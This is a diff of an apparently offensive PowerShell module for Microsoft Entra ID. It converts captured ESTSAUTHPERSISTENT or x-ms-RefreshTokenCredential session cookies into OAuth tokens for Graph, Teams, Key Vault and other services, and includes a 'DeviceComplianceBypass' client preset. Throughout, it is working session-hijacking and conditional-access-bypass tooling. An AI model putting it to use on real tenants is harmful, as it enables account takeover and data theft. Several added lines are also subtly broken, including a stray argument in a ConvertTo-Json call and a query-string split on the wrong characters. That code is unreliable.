@@ -190,7 +190,7 @@ function Get-AzureToken {
     }
 
     # Login Process
-    Write-Verbose ( $body | ConvertTo-Json )
+    Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
     try {
         $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://$BaseUrl/common/oauth2/v2.0/devicecode" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
     } catch {
@@ -206,12 +206,12 @@ function Get-AzureToken {
         "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
         "device_code" = $authResponse.device_code
     }
-    Write-Verbose ($body | ConvertTo-Json)
+    Write-Verbose ($body | ConvertTo-Json -Depth 99 s)
     if ($UseCAE) {
         # Add 'cp1' as client claim to get a access token valid for 24 hours
         $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
         $body.Add("claims", $Claims)
-        Write-Verbose ( $body | ConvertTo-Json )
+        Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
     }
     while ($continue) {
         Start-Sleep -Seconds $interval
@@ -241,7 +241,7 @@ function Get-AzureToken {
 
         # If we got response, all okay!
         if ($response) {
-            Write-Output "Token acquired and saved as `$response"
+            Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
             $jwt = $response.access_token
 
             $output = ConvertFrom-JWTtoken -token $jwt
@@ -252,46 +252,48 @@ function Get-AzureToken {
     }
 }
 
-function Get-AzureTokenFromESTSCookie {
+function Get-AzureTokenFromCookie {
 
     <#
     .DESCRIPTION
-        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow.
+        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow and a cookie
         Authenticates to MSGraph as Teams FOCI client by default.
         https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow
 
     .EXAMPLE
-        Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
+        Get-AzureTokenFromCookie -CookieType ESTSAUTHPERSISTENT -CookieValue "0.AbcAp.."
 
     .AUTHOR
         Adapted for PowerShell by https://github.com/rotarydrone from ROADtools by https://github.com/dirkjanm
         https://github.com/rvrsh3ll/TokenTactics/pull/9
         https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)#selenium-based-authentication
+
+        Extended to support appverify endpoint, multiple cookie formats and full error handling by Fabian Bader
     #>
 
     [cmdletbinding()]
     Param(
         [Parameter(Mandatory = $True)]
         [String[]]
-        $ESTSAuthCookie,
-        [Parameter(Mandatory = $False)]
+        [ValidateSet("ESTSAUTHPERSISTENT", "x-ms-RefreshTokenCredential")]
+        $CookieType,
+        [Parameter(Mandatory = $True)]
         [String[]]
-        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "GraphCABypass", "Custom")]
-        $Client = "MSTeams",
+        $CookieValue,
         [Parameter(Mandatory = $False)]
         [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
         [String]$Device,
         [Parameter(Mandatory = $False)]
         [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
         [String]$Browser,
-        [Parameter(Mandatory = $False)]
-        [String]$ClientID,
+        [Parameter(Mandatory = $true)]
+        [String]$ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264", # Microsoft Teams
         [Parameter(Mandatory = $False)]
         [String]$Resource = "https://graph.microsoft.com",
-        [Parameter(Mandatory = $False)]
+        [Parameter(Mandatory = $true)]
         [String]$Scope = "openid offline_access",
-        [Parameter(Mandatory = $False)]
-        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
+        [Parameter(Mandatory = $true)]
+        [String]$RedirectUrl
     )
 
     if ($Device) {
@@ -308,39 +310,22 @@ function Get-AzureTokenFromESTSCookie {
         }
     }
 
-    if ($Client -eq "MSTeams") {
-        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
-    } elseif ($Client -eq "MSEdge") {
-        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
-    } elseif ($Client -eq "AzurePowershell") {
-        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
-    } elseif ($Client -eq "GraphCABypass") {
-        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
-        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
-    } elseif ($Client -eq "Custom") {
-        if ([string]::IsNullOrWhiteSpace($ClientID)) {
-            Write-Error "ClientID must be provided for Custom client"
-            return
-        }
-        if ([string]::IsNullOrWhiteSpace($Scope)) {
-            Write-Error "Scope must be provided for Custom client"
-            return
-        }
-    }
-    Write-Warning "This function currently only supports the v1 endpoint and may not work for all applications."
+    Write-Verbose "This function currently only supports the v1 endpoint and may not work for all applications."
     Write-Verbose "ClientID: $ClientID"
     Write-Verbose "Resource: $Resource"
     Write-Verbose "Scope: $Scope"
     Write-Verbose "RedirectUrl: $RedirectUrl"
+    Write-Verbose "CookieType: $CookieType"
+    Write-Verbose "UserAgent: $UserAgent"
 
     $Headers = @{}
     $Headers["User-Agent"] = $UserAgent
 
-    $session = [Microsoft.PowerShell.Commands.WebRequestSession]::new()
+    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
     $session.UserAgent = $UserAgent
     # Add basic cookies to the session
     $null = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/error"
-    $cookie = [System.Net.Cookie]::new("ESTSAUTHPERSISTENT", $ESTSAuthCookie)
+    $cookie = [System.Net.Cookie]::new($CookieType, $CookieValue)
     $session.Cookies.Add('https://login.microsoftonline.com/', $cookie)
     $SessionCookies = $session.Cookies.GetCookies('https://login.microsoftonline.com') | Select-Object -ExpandProperty Name
     Write-Verbose "Session cookies: $( $SessionCookies -join ', ' )"
@@ -351,32 +336,79 @@ function Get-AzureTokenFromESTSCookie {
     # Get the authorization code from the STS
     $Uri = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($ClientID)&resource=$($Resource)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
     Write-Verbose "Requesting URL: $Uri"
-    Write-Output "Calling authorization endpoint with ESTSAUTHPERSISTENT"
+    Write-Output "$([char]0x2718)  Calling authorization endpoint with $CookieType cookie"
     if ($PSVersionTable.PSEdition -ne "Core") {
         $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
     } else {
         $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
     }
 
-    if ( $sts_response.RawContent -match "\`$Config=(.*);" ) {
+    Write-Verbose "Status code: $($sts_response.StatusCode)"
+    if ( $sts_response.StatusCode -eq 200 -and $sts_response.RawContent -match "\`$Config=(.*);" ) {
+        Write-Verbose "AppConfig found in initial response"
         $AppConfig = $Matches[1] | ConvertFrom-Json
-        Write-Output "appverify step required for $($AppConfig.sAppName). Calling appverify endpoint"
-        $Uri = "https://login.microsoftonline.com/appverify"
-        $Body = @{
-            "ContinueAuth"    = "true"
-            "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
-            "canary"          = $AppConfig.canary
-            "iscsrfspeedbump" = "false"
-            "flowToken"       = $AppConfig.sFT
-            "hpgrequestid"    = $sts_response.Headers['x-ms-request-id']
-            "ctx"             = $AppConfig.sCtx
+        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
+        #region error handling
+        if ( -not [string]::IsNullOrWhiteSpace( $AppConfig.sErrorCode ) ) {
+            Invoke-EntraErrorHandling -AppConfig $AppConfig
+            return
         }
-        if ($PSVersionTable.PSEdition -ne "Core") {
-            $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
-        } else {
-            $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers
+        #endregion
+
+        #region CmsiInterrupt - For security reasons, user confirmation is required for this request. Interrupt is shown for all scheme redirects in mobile browsers.
+        if ( $AppConfig.pgid -eq "CmsiInterrupt" ) {
+            Write-Output "$([char]0x2718)  AADSTS50199: CmsiInterrupt"
+            Write-Output "   For security reasons, user confirmation is required for this application: $($AppConfig.sAppName)."
+            Write-Output "$([char]0x2718)  urlPost URL: $($AppConfig.urlPost)"
+            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sDeviceId)) {
+                Write-Output "$([char]0x2718)  Device Id: $($AppConfig.sDeviceId)"
+            }
+            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.correlationId)) {
+                Write-Output "$([char]0x2718)  Correlation Id: $($AppConfig.correlationId)"
+            }
+            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sessionId)) {
+                Write-Output "$([char]0x2718)  Session Id: $($AppConfig.sessionId)"
+            }
+            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sPOST_Username)) {
+                Write-Output "$([char]0x2718)  Username: $($AppConfig.sPOST_Username)"
+            }
+            $Uri = "https://login.microsoftonline.com/appverify"
+            $Body = @{
+                "ContinueAuth"    = "true"
+                "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
+                "canary"          = $AppConfig.canary
+                "iscsrfspeedbump" = "false"
+                "flowToken"       = $AppConfig.sFT
+                "hpgrequestid"    = $sts_response.Headers['x-ms-request-id']
+                "ctx"             = $AppConfig.sCtx
+            }
+            if ($PSVersionTable.PSEdition -ne "Core") {
+                $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
+            } else {
+                $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
+            }
         }
+        #endregion
     }
+    
+
+    Write-Debug "Response: $($sts_response.RawContent)"
+    #region Manual sign-in required
+    if ($sts_response.StatusCode -eq 302 -and $sts_response.Headers.Location -notmatch "code=") {
+        Write-Verbose "$([char]0x2718)  Single sign-on failed. Redirected to $($sts_response.Headers.Location)"
+        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "$($sts_response.Headers.Location)" -Headers $Headers
+        if ( $sts_response.RawContent -match "\`$Config=(.*);" ) {
+            $AppConfig = $Matches[1] | ConvertFrom-Json
+            Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99 )"
+            Invoke-EntraErrorHandling -AppConfig $AppConfig
+        } else {
+            Write-Output "$([char]0x2718)  Could not find AppConfig in response"
+            Write-Output "    Unknown error occurred"
+            Write-Debug "Response: $($sts_response.RawContent)"
+        }
+        return
+    }
+    #endregion
 
     if ($sts_response.StatusCode -eq 302) {
         if ($PSVersionTable.PSEdition -ne "Core") {
@@ -401,17 +433,17 @@ function Get-AzureTokenFromESTSCookie {
             $AuthorizationCode = $queryParams['code']
             Write-Verbose "Authorization Code: $($AuthorizationCode[0..10] -join '' )..."
         } else {
-            Write-Output "[-] Code not found in redirected URL path"
+            Write-Output "$([char]0x2718)  Code not found in redirected URL path"
             Write-Output "    Requested URL: $($Uri)"
             Write-Output "    Response Code: $($sts_response.StatusCode)"
             Write-Output "    Response URI:  $($sts_response.Headers.Location)"
             return
         }
     } else {
-        Write-Output "[-] Expected 302 redirect but received other status"
-        Write-Output "    Requested URL: $($Uri)"
-        Write-Output "    Response Code: $($sts_response.StatusCode)"
-        Write-Output "[-] The request may require user interation to complete, or the provided cookie is invalid"
+        $sts_response.RawContent -match "\`$Config=(.*);" | Out-Null
+        $AppConfig = $Matches[1] | ConvertFrom-Json
+        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
+        Invoke-EntraErrorHandling -AppConfig $AppConfig
         return
     }
 
@@ -430,11 +462,168 @@ function Get-AzureTokenFromESTSCookie {
             $output = ConvertFrom-JWTtoken -token $response.access_token
             $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
             $global:TokenUpn = $output.upn
-            Write-Output "Token acquired and saved as `$response"
+            Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
         } catch {
             Write-Error "Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
         }
     }
+}
+
+function Get-AzureTokenFromESTSCookie {
+
+    <#
+    .DESCRIPTION
+        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow using an ESTS cookie for authentication.
+
+    .EXAMPLE
+        Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."
+
+    .AUTHOR
+        Fabian Bader
+    #>
+
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $True)]
+        [String[]]
+        $ESTSAuthCookie,
+        [Parameter(Mandatory = $False)]
+        [String[]]
+        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "DeviceComplianceBypass", "Custom")]
+        $Client = "MSTeams",
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory = $False)]
+        [String]$ClientID,
+        [Parameter(Mandatory = $False)]
+        [String]$Resource = "https://graph.microsoft.com",
+        [Parameter(Mandatory = $False)]
+        [String]$Scope = "openid offline_access",
+        [Parameter(Mandatory = $False)]
+        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
+    )
+
+
+    if ($Client -eq "MSTeams") {
+        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+    } elseif ($Client -eq "MSEdge") {
+        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
+    } elseif ($Client -eq "AzurePowershell") {
+        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
+    } elseif ($Client -eq "DeviceComplianceBypass") {
+        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
+        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
+    } elseif ($Client -eq "Custom") {
+        if ([string]::IsNullOrWhiteSpace($ClientID)) {
+            Write-Error "ClientID must be provided for Custom client"
+            return
+        }
+        if ([string]::IsNullOrWhiteSpace($Scope)) {
+            Write-Error "Scope must be provided for Custom client"
+            return
+        }
+    }
+
+    $Parameters = @{
+        "CookieType"  = "ESTSAUTHPERSISTENT"
+        "CookieValue" = $ESTSAuthCookie
+        "ClientID"    = $ClientID
+        "Scope"       = $Scope
+        "RedirectUrl" = $RedirectUrl
+        "Verbose"     = $VerbosePreference
+    }
+    if ($Device) {
+        $Parameters.Add("Device", $Device)
+    }
+    if ($Browser) {
+        $Parameters.Add("Browser", $Browser)
+    }
+    if ($Resource) {
+        $Parameters.Add("Resource", $Resource)
+    }
+    Get-AzureTokenFromCookie @Parameters
+}
+
+function Get-AzureTokenFromRefreshTokenCredentialCookie {
+
+    <#
+    .DESCRIPTION
+        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow using an x-ms-RefreshTokenCredential cookie for authentication.
+
+    .EXAMPLE
+        Get-AzureTokenFromRefreshTokenCredentialCookie -Client MSTeams -RefreshTokenCredential "eyJhbGciOiJ..."
+
+    .AUTHOR
+        Fabian Bader
+    #>
+
+    [cmdletbinding()]
+    Param(
+        [Parameter(Mandatory = $True)]
+        [String[]]
+        $RefreshTokenCredential,
+        [Parameter(Mandatory = $False)]
+        [String[]]
+        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "DeviceComplianceBypass", "Custom")]
+        $Client = "MSTeams",
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
+        [String]$Device,
+        [Parameter(Mandatory = $False)]
+        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
+        [String]$Browser,
+        [Parameter(Mandatory = $False)]
+        [String]$ClientID,
+        [Parameter(Mandatory = $False)]
+        [String]$Resource = "https://graph.microsoft.com",
+        [Parameter(Mandatory = $False)]
+        [String]$Scope = "openid offline_access",
+        [Parameter(Mandatory = $False)]
+        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
+    )
+
+
+    if ($Client -eq "MSTeams") {
+        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
+    } elseif ($Client -eq "MSEdge") {
+        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
+    } elseif ($Client -eq "AzurePowershell") {
+        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
+    } elseif ($Client -eq "DeviceComplianceBypass") {
+        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
+        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
+    } elseif ($Client -eq "Custom") {
+        if ([string]::IsNullOrWhiteSpace($ClientID)) {
+            Write-Error "ClientID must be provided for Custom client"
+            return
+        }
+        if ([string]::IsNullOrWhiteSpace($Scope)) {
+            Write-Error "Scope must be provided for Custom client"
+            return
+        }
+    }
+    $Parameters = @{
+        "CookieType"  = "x-ms-RefreshTokenCredential"
+        "CookieValue" = $RefreshTokenCredential
+        "ClientID"    = $ClientID
+        "Scope"       = $Scope
+        "RedirectUrl" = $RedirectUrl
+        "Verbose"     = $VerbosePreference
+    }
+    if ($Device) {
+        $Parameters.Add("Device", $Device)
+    }
+    if ($Browser) {
+        $Parameters.Add("Browser", $Browser)
+    }
+    if ($Resource) {
+        $Parameters.Add("Resource", $Resource)
+    }
+    Get-AzureTokenFromCookie @Parameters
 }
 
 function Get-AzureTokenFromAuthorizationCode {
@@ -448,7 +637,7 @@ function Get-AzureTokenFromAuthorizationCode {
         Get-AzureTokenFromAuthorizationCode -Client MSGraph -AuthorizationCode "1.AXkAT2xo4yev..."
 
     .AUTHOR
-        Adapted for TokenTactics from the original code by 
+        Adapted for TokenTactics from the original code by
         @gladstomych https://github.com/JumpsecLabs/TokenSmith and
         @zh54321 https://github.com/zh54321/PoCEntraDeviceComplianceBypass/blob/main/poc_entra_compliance_bypass.ps1
 
@@ -506,7 +695,7 @@ function Get-AzureTokenFromAuthorizationCode {
         $paramPairs = $query.Split('&')
 
         foreach ($pair in $paramPairs) {
-            $parts = $pair.Split('=')
+            $parts = $pair.Split('= ')
             $key = $parts[0]
             $value = $parts[1]
             $queryParams[$key] = $value
@@ -563,7 +752,7 @@ function Get-AzureTokenFromAuthorizationCode {
         $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
         $body.Add("claims", $Claims)
     }
-    Write-Verbose ( $body | ConvertTo-Json )
+    Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
     #endregion
 
     #region Exchange authorization code for tokens
@@ -572,7 +761,7 @@ function Get-AzureTokenFromAuthorizationCode {
         $output = ConvertFrom-JWTtoken -token $response.access_token
         $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
         $global:TokenUpn = $output.upn
-        Write-Output "Token acquired and saved as `$response"
+        Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
     } catch {
         Write-Error "Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
     }
@@ -583,7 +772,7 @@ function Get-AzureTokenFromAuthorizationCode {
 function Get-AzureAuthorizationCode {
     <#
     .DESCRIPTION
-        
+
 
     .EXAMPLE
         # Use Windows based Redirect URL
@@ -593,7 +782,7 @@ function Get-AzureAuthorizationCode {
         Get-AzureAuthorizationCode -RedirectUrl "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
 
     .AUTHOR
-        Adapted for TokenTactics from the original code by 
+        Adapted for TokenTactics from the original code by
         @gladstomych https://github.com/JumpsecLabs/TokenSmith and
         @zh54321 https://github.com/zh54321/PoCEntraDeviceComplianceBypass/blob/main/poc_entra_compliance_bypass.ps1
     #>
@@ -643,7 +832,7 @@ function Get-AzureAuthorizationCode {
         # Add 'cp1' as client claim to get a access token valid for 24 hours
         $BaseUrl += "&claims=" + ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
     }
-    
+
     Write-Output $([uri]::EscapeUriString($BaseUrl))
     if ($OpenInBrowser) {
         Start-Process $BaseUrl
@@ -694,7 +883,7 @@ function Invoke-RefreshToSubstrateToken {
     }
 
     $global:SubstrateToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$SubstrateToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$SubstrateToken"
     $SubstrateToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -734,7 +923,7 @@ function Invoke-RefreshToMSManageToken {
     }
 
     $global:MSManageToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$MSManageToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$MSManageToken"
     $MSManageToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -774,7 +963,7 @@ function Invoke-RefreshToMSTeamsToken {
     }
 
     $global:MSTeamsToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$MSTeamsToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$MSTeamsToken"
     $MSTeamsToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -814,7 +1003,7 @@ function Invoke-RefreshToOfficeManagementToken {
     }
 
     $global:OfficeManagementToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$OfficeManagementToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$OfficeManagementToken"
     $OfficeManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -854,7 +1043,7 @@ function Invoke-RefreshToOutlookToken {
     }
 
     $global:OutlookToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$OutlookToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$OutlookToken"
     $OutlookToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -894,7 +1083,7 @@ function Invoke-RefreshToMSGraphToken {
     }
 
     $global:MSGraphToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$MSGraphToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$MSGraphToken"
     $MSGraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -935,7 +1124,7 @@ function Invoke-RefreshToGraphToken {
     }
 
     $global:GraphToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$GraphToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$GraphToken"
     $GraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -976,7 +1165,7 @@ function Invoke-RefreshToOfficeAppsToken {
     }
 
     $global:OfficeAppsToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$OfficeAppsToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$OfficeAppsToken"
     $OfficeAppsToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1017,7 +1206,7 @@ function Invoke-RefreshToAzureCoreManagementToken {
     }
 
     $global:AzureCoreManagementToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$AzureCoreManagementToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureCoreManagementToken"
     $AzureCoreManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1058,7 +1247,7 @@ function Invoke-RefreshToAzureStorageToken {
     }
 
     $global:AzureStorageToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$AzureStorageToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureStorageToken"
     $AzureStorageToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1099,7 +1288,7 @@ function Invoke-RefreshToAzureKeyVaultToken {
     }
 
     $global:AzureKeyVaultToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$AzureKeyVaultToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureKeyVaultToken"
     $AzureKeyVaultToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1140,7 +1329,7 @@ function Invoke-RefreshToAzureManagementToken {
     }
 
     $global:AzureManagementToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$AzureManagementToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureManagementToken"
     $AzureManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1181,7 +1370,7 @@ function Invoke-RefreshToMAMToken {
     }
 
     $global:MAMToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$MamToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$MamToken"
     $MamToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1222,7 +1411,7 @@ function Invoke-RefreshToDODMSGraphToken {
     }
 
     $global:DODMSGraphToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$DODMSGraphToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$DODMSGraphToken"
     $DODMSGraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1273,7 +1462,7 @@ function Invoke-RefreshToSharePointToken {
     }
 
     $global:SharePointToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$SharePointToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$SharePointToken"
     $SharePointToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 function Invoke-RefreshToOneDriveToken {
@@ -1313,7 +1502,7 @@ function Invoke-RefreshToOneDriveToken {
     }
 
     $global:OneDriveToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$OneDriveToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$OneDriveToken"
     $OneDriveToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1353,7 +1542,7 @@ function Invoke-RefreshToYammerToken {
     }
 
     $global:YammerToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$YammerToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$YammerToken"
     $YammerToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1395,7 +1584,7 @@ function Invoke-RefreshToDeviceRegistrationToken {
     }
 
     $global:DeviceRegistrationToken = Invoke-RefreshToToken @Parameters
-    Write-Output "Token acquired and saved as `$DeviceRegistrationToken"
+    Write-Output "$([char]0x2713)  Token acquired and saved as `$DeviceRegistrationToken"
     $DeviceRegistrationToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
 }
 
@@ -1470,7 +1659,7 @@ function Invoke-RefreshToToken {
         $body.Add("resource", $Resource)
     }
 
-    Write-Verbose ( $body | ConvertTo-Json )
+    Write-Verbose ( $body | ConvertTo-Json -Depth 99)
 
     if ($UseV1Endpoint) {
         $uri = "$($authUrl)/oauth2/token"
